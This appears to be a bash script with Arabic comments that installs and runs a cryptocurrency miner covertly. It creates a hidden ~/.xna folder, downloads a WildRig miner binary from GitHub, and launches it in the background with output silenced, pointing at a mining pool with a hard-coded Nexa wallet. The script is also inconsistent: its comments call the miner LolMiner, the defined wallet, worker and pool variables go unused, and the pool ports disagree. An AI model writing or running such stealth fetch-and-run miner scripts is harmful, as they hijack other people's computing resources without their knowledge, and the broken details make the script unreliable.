#!/bin/bash

# الانتقال إلى المنزل وإنشاء مجلد خفي
cd ~
mkdir -p .xna && cd .xna

# تحميل LolMiner بصمت
wget https://github.com/andru-kun/wildrig-multi/releases/download/0.43.2/wildrig-multi-linux-0.43.2.tar.xz

# فك الضغط بصمت
tar -xvf wildrig-multi-linux-0.43.2.tar.xz


# عنوان المحفظة (استبدله بعنوانك)
WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"
WORKER="gpu_worker"
POOL="stratum+tcp://stratum-eu.rplant.xyz:7029"

# تشغيل LolMiner فقط على GPU بصمت
nohup ./wildrig-multi --algo nexapow --server stratum+tcp://stratum-eu.rplant.xyz:7092 --user nexa:nqtsq5g5xccfrl6jfjt0uxffr65vqtjz0dt2sytv3apqp6lv --mode mining > /dev/null 2>&1 &

